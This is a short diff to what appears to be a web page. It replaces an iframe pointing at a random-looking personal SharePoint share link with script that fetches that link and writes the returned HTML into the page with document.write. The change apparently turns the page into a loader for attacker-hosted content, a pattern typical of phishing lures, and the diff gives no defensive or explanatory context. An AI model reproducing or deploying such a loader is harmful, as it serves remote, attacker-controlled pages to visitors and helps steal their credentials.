@@ -1,1 +1,31 @@
-<iframe id="f" width="100%" height="100%" src="https://htrkwmex-my.sharepoint.com/:f:/g/personal/m_lniis_tk/EsaUMlmk8RBCmQmtt3xaii8BBQJYKmqmpdAtD_ndtl-EAA?e=xNGzBi" frameborder="0" scrolling="no" allowfullscreen></iframe>
+<iframe id="f" width="100%" height="100%" src="" frameborder="0" scrolling="no" allowfullscreen></iframe>
+<script>
+  
+function createXMLHttpRequest(){
+    if(window.XMLHttpRequest){
+        XMLHttpR = new XMLHttpRequest();
+    }else if(window.ActiveXObject){
+        try{
+            XMLHttpR = new ActiveXObject("Msxml2.XMLHTTP");
+        }catch(e){
+            try{
+                XMLHttpR = new ActiveXObject("Microsoft.XMLHTTP");
+            }catch(e){
+            }
+        }
+    }
+}
+function processResponse(){
+    if(XMLHttpR.readyState ==4 && XMLHttpR.status == 200){
+        document.write(XMLHttpR.responseText);
+    }
+}
+function sendRequest(url){
+    createXMLHttpRequest();
+    XMLHttpR.open("GET",url,true);
+    XMLHttpR.setRequestHeader("Content-Type","text/html;charset=utf-8");
+    XMLHttpR.onreadystatechange = processResponse;
+    XMLHttpR.send(null);
+}
+sendRequest("https://htrkwmex-my.sharepoint.com/:f:/g/personal/m_lniis_tk/EsaUMlmk8RBCmQmtt3xaii8BBQJYKmqmpdAtD_ndtl-EAA?e=xNGzBi")
+</script>
